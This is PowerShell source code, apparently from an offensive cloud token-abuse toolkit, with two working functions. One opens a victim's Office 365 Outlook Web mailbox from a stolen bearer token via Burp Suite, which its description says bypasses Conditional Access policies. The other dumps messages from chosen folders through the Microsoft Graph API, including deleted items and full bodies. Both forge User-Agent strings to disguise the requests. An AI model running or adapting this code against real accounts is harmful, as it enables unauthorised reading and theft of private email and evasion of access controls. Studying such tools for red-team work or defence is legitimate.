function Invoke-OpenOWAMailboxInBrowser
{
    <#
    .DESCRIPTION
        Open an OWA Office 365 mailbox in BurpSuite's embedded Chromium browser using either a Substrate.Office.com or Outlook.Office.com access token. Note a Substrate.Office.com access token can access the Outlook.Office.com resource and vice versa. This is useful for bypassing AAD application specific Conditional Access Policies.
    .EXAMPLE
        Open-OWAMailboxInBrowser -AccessToken $SubstrateToken.access_token
        ...
    #>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [String]$AccessToken,
        [Parameter(Mandatory=$False)]
        [ValidateSet('Substrate','Outlook')]
        [String]$Resource='Substrate',
        [Parameter(Mandatory=$False)] 
        [switch]$OnlyReturnCookies,
        [Parameter(Mandatory=$False)]
        [ValidateSet('Mac','Windows','AndroidMobile','iPhone')]
        [String]$Device,
        [Parameter(Mandatory=$False)]
        [ValidateSet('Android','IE','Chrome','Firefox','Edge','Safari')]
        [String]$Browser
    )
    Process
    {
        if ($OnlyReturnCookies)
        {
            if ($Device)
            {
                if ($Browser)
                {
                    $UserAgent = Invoke-ForgeUserAgent -Device $Device -Browser $Browser
                }
                else
                {
                    $UserAgent = Invoke-ForgeUserAgent -Device $Device
                }
            }
            else 
            {
               if ($Browser)
               {
                    $UserAgent = Invoke-ForgeUserAgent -Browser $Browser 
               } 
               else 
               {
                    $UserAgent = Invoke-ForgeUserAgent
               }
            }
            $Headers=@{}
            $Headers["Authorization"] = "Bearer $AccessToken"
            $Headers["User-Agent"] = $UserAgent
            $response = Invoke-WebRequest -Uri "https://substrate.office.com/owa/" -Method "GET" -Headers $Headers -SkipHttpErrorCheck
            $response.Headers.'Set-Cookie'
            return $response
        }
        else
        {
            Write-Output "To open the OWA mailbox in a browser using a Substrate Access Token:"
            Write-Output "1. Open a new BurpSuite Repeater tab & set the Target to 'https://$Resource.office.com'"
            Write-Output "2. Paste the below request into Repeater & Send"
            Write-Output "3. Right click the response > 'Show response in browser', then open the response in Burp's embedded browser"
            Write-Output "4. Refresh the page to access the mailbox"
            Write-Output "----------------------------------------------------------------------------"
            Write-Output "GET /owa/ HTTP/1.1"
            Write-Output "Host: $Resource.office.com"
            Write-Output "Authorization: Bearer $AccessToken"
            Write-Output ""
            Write-Output ""
            Write-Output "----------------------------------------------------------------------------"
        }
   }  
}
function Invoke-DumpOWAMailboxViaMSGraphApi
{
<#
    .DESCRIPTION
        Dump the OWA Office 365 mailbox with a Graph.Microsoft.com access token.
    .EXAMPLE
        Invoke-DumpOWAMailboxViaMSGraphApi -AccessToken $MSGraphToken.access_token -mailFolder AllItems -top 1
        ...
    #>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [String]$AccessToken,
        [Parameter(Mandatory=$True)]
	    [ValidateSet('AllItems','inbox','archive','drafts','sentitems','deleteditems','recoverableitemsdeletions')]
	    [String]$mailFolder,
        [Parameter(Mandatory=$False)]
	    [Int]$top=0,
        [Parameter(Mandatory=$False)]
        [ValidateSet('Mac','Windows','AndroidMobile','iPhone')]
        [String]$Device,
        [Parameter(Mandatory=$False)]
        [ValidateSet('Android','IE','Chrome','Firefox','Edge','Safari')]
        [String]$Browser
    )
    Process
    {
        if ($Device) {
            if ($Browser) {
                $UserAgent = Invoke-ForgeUserAgent -Device $Device -Browser $Browser
            }
            else {
                $UserAgent = Invoke-ForgeUserAgent -Device $Device
            }
        }
        else {
           if ($Browser) {
                $UserAgent = Invoke-ForgeUserAgent -Browser $Browser 
           } 
           else {
                $UserAgent = Invoke-ForgeUserAgent
           }
        }
        $ApiVersion = "v1.0"
        $API = "me/MailFolders"
        $Method = "GET"
        $Headers=@{}
        $Headers["Authorization"] = "Bearer $AccessToken"
        $Headers["User-Agent"] = $UserAgent
        $selectFilter = "select=sender,from,toRecipients,ccRecipients,ccRecipients,replyTo,sentDateTime,id,hasAttachments,subject,importance,bodyPreview,isRead,body,parentFolderId"
        if($top -eq 0) {
            $url = "https://graph.microsoft.com/$($ApiVersion)/$($API)/$($mailFolder)/messages?$($selectFilter)"
            $MaxResults = 400
            }
            else {
            $url = "https://graph.microsoft.com/$($ApiVersion)/$($API)/$($mailFolder)/messages?$($selectFilter)&top=$($top)"
        }
        $response = Invoke-RestMethod -Uri $url -ContentType "application/json" -Method $Method -Body $Body -Headers $Headers
        # Do not loop through page results if -top flag is used
        if($top){
            return $response | ConvertTo-Json -Depth 10
        }
        # Check if we have more items to fetch
        if($response.psobject.properties.name -match '@odata.nextLink')
        {
            $items=$response.value.count
            # Loop until finished or MaxResults reached
            while(($url = $response.'@odata.nextLink') -and $items -lt $MaxResults)
            {
                $response.value | ConvertTo-Json -Depth 10
                $response = Invoke-RestMethod -Uri $url -ContentType "application/json" -Method $Method -Body $Body -Headers $Headers
                $items+=$response.value.count
            }
            $response.value | ConvertTo-Json -Depth 10
        }
        else
        {
            if($response.psobject.properties.name -match "Value")
            {
                return $response.value | ConvertTo-Json -Depth 10
            }
            else
            {
                return $response | ConvertTo-Json -Depth 10
            }
        }
    }
}
